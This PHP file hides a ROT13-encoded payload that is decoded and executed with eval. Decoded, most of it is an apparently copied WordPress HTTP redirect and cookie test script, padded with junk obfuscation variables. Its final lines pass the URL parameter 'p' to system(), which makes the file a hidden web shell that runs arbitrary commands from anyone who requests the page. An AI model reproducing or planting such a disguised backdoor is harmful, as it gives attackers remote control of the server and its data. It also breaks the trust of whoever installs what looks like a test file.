<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

// Gunaxf JbeqCerff...
shapgvba vf_ffy() {
	vs ( vffrg($_FREIRE['UGGCF']) ) {
		vs ( 'ba' == fgegbybjre($_FREIRE['UGGCF']) )
			erghea gehr;
		vs ( '1' == $_FREIRE['UGGCF'] )
			erghea gehr;
	} ryfrvs ( vffrg($_FREIRE['FREIRE_CBEG']) && ( '443' == $_FREIRE['FREIRE_CBEG'] ) ) {
		erghea gehr;
	}
	erghea snyfr;
}

$hey = ( vf_ffy() ? 'uggcf://' : 'uggc://' ) . $_FREIRE['UGGC_UBFG'] . (!rzcgl($_FREIRE['UGGC_CBFG']) && 80 != $_FREIRE['UGGC_CBFG'] ? ':' . $_FREIRE['UGGC_CBFG'] : '');
vs ( fgecbf($_FREIRE['ERDHRFG_HEV'], '?') )
	$hey .= fhofge($_FREIRE['ERDHRFG_HEV'], 0, fgecbf($_FREIRE['ERDHRFG_HEV'], '?'));
ryfr
	$hey .= $_FREIRE['ERDHRFG_HEV'];

vs ( vffrg($_TRG['fbhepr']) ) {
	uvtuyvtug_svyr(__SVYR__ );
	rkvg;
}

vs ( vffrg($_TRG['201-ybpngvba']) ) {
	urnqre(\"UGGC/1.1 201 BX\");
	vs ( vffrg($_TRG['snvy']) ) {
		rpub \"SNVY\";
	} ryfr {
		urnqre(\"Ybpngvba: $hey?201-ybpngvba&snvy=gehr\", gehr, 201);
		rpub \"CNFF\";
	}
	rkvg;
}
vs ( vffrg($_TRG['urnqre-purpx']) ) {
	$bhg = neenl();
	urnqre(\"Pbagrag-Glcr: grkg/cynva\");
	sbernpu ( $_FREIRE nf $xrl => $inyhr ) {
		vs ( fgevcbf($xrl, 'uggc') === 0 ) {
			$xrl = fgegbybjre(fhofge($xrl, 5));
			rpub \"$xrl:$inyhr\a\";
		}
	}
	rkvg;
}
vs ( vffrg($_TRG['zhygvcyr-urnqref']) ) {
	urnqre(\"UrnqreAnzr: Bar\", snyfr);
	urnqre(\"UrnqreAnzr: Gjb\", snyfr);
	urnqre(\"UrnqreAnzr: Guerr\", snyfr);
	rkvg;
}

vs ( vffrg( $_TRG['cbfg-erqverpg-gb-zrgubq'] ) ) {
	$zrgubq = $_FREIRE['ERDHRFG_ZRGUBQ'];
	$erfcbafr_pbqr = vffrg( $_TRG['erfcbafr_pbqr'] ) ? $_TRG['erfcbafr_pbqr'] : 301;

	vs ( 'CBFG' == $zrgubq && ! vffrg( $_TRG['erqverpgvba-cresbezrq'] ) ) {
		urnqre( \"Ybpngvba: $hey?cbfg-erqverpg-gb-zrgubq=1&erqverpgvba-cresbezrq=1\", gehr, $erfcbafr_pbqr );
		rkvg;
	}

	rpub $zrgubq;
	rkvg;

}

vs ( vffrg( $_TRG['ybpngvba-jvgu-200'] ) ) {
	vs ( ! vffrg( $_TRG['erqverpgvba-cresbezrq'] ) ) {
		urnqre( \"UGGC/1.1 200 BX\" );
		urnqre( \"Ybpngvba: $hey?ybpngvba-jvgu-200=1&erqverpgvba-cresbezrq\", gehr, 200 );
		rpub 'CNFF';
		rkvg;
	}
	// Erqverpgvba jnf sbyybjrq.
	rpub 'SNVY';
	rkvg;
}

vs ( vffrg( $_TRG['cevag-cnff'] ) ) {
	rpub 'CNFF';
	rkvg;
}

vs ( vffrg( $_TRG['zhygvcyr-ybpngvba-urnqref'] ) ) {
	vs ( ! vffrg( $_TRG['erqverpgrq'] ) ) {
		urnqre( \"Ybpngvba: $hey?zhygvcyr-ybpngvba-urnqref=1&erqverpgrq=bar\", snyfr );
		urnqre( \"Ybpngvba: $hey?zhygvcyr-ybpngvba-urnqref=1&erqverpgrq=gjb\", snyfr );
		rkvg;
	}
	vs ( 'gjb' != $_TRG['erqverpgrq'] )
		rpub 'SNVY';
	ryfr
		rpub 'CNFF';
	rkvg;
}

vs ( vffrg( $_TRG['pbbxvr-grfg'] ) ) {
	vs ( 'grfg-pbbxvr' != $_TRG['pbbxvr-grfg'] ) {
		frgpbbxvr( 'ncv_grfg_pbbxvr', 'inyhr', gvzr() + 365*24*60*60, '/pber/grfgf/1.0/', 'ncv.jbeqcerff.bet' );
		frgpbbxvr( 'ncv_grfg_pbbxvr_zvavzny', 'inyhr'  );
		frgpbbxvr( 'ncv_grfg_pbbxvr_jebat_ubfg', 'inyhr', gvzr() + 365*24*60*60, '/', 'rknzcyr.pbz' );
		frgpbbxvr( 'ncv_grfg_jvyqpneq_qbznva', 'inyhr', gvzr() + 365*24*60*60, '/', '.jbeqcerff.bet' );
		frgpbbxvr( 'ncv_grfg_pbbxvr_rkcverq', 'inyhr', gvzr() - 365*24*60*60, '/', '.jbeqcerff.bet' );
		urnqre( \"Ybpngvba: $hey?pbbxvr-grfg=grfg-pbbxvr\" );
		rkvg;
	}

	vs ( rzcgl( $_PBBXVR['ncv_grfg_pbbxvr'] ) || 'inyhr' != $_PBBXVR['ncv_grfg_pbbxvr'] )
		qvr( 'SNVY_AB_PBBXVR' );
	vs ( rzcgl( $_PBBXVR['ncv_grfg_pbbxvr_zvavzny'] ) )
		qvr( 'SNVY_AB_ZVAVZNY' );
	vs ( vffrg( $_PBBXVR['ncv_grfg_pbbxvr_jebat_ubfg'] ) )
		qvr( 'SNVY_JEBAT_UBFG' );
	vs ( rzcgl( $_PBBXVR['ncv_grfg_jvyqpneq_qbznva'] ) )
		qvr( 'SNVY_AB_JVYQPNEQ' );
	vs ( vffrg( $_PBBXVR['ncv_grfg_pbbxvr_rkcverq'] ) )
		qvr( 'SNVY_RKCVERQ_PBBXVR' );

	rpub 'CNFF';
	rkvg;
}


$eg = vffrg($_TRG['eg']) ? $_TRG['eg'] : 5;
$e = vffrg($_TRG['e']) ? $_TRG['e'] : 0;

vs ( $e < $eg ) {
	$pbqr = vffrg($_TRG['pbqr']) ? (vag)$_TRG['pbqr'] : 302;
	urnqre(\"Ybpngvba: $hey?eg=\" . $eg . \"&e=\" . ($e+1), gehr, $pbqr);
	rpub \"Erqverpg $e bs $eg\";
	rkvg;
}
rpub \"Erqverpg $e bs $eg vf SVANY.<oe/>\";
rpub \"TRG['eg'] = Gbgny gvzrf gb erqverpg. Qrsnhygf gb 5.<oe />\";
rpub \"TRG['e'] = Pheerag erqverpgvba. Qrsnhygf gb 0.<oe />\";
rpub \"<n uers='$hey?fbhepr=gehr'>Ivrj Fbhepr</n>\";


$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>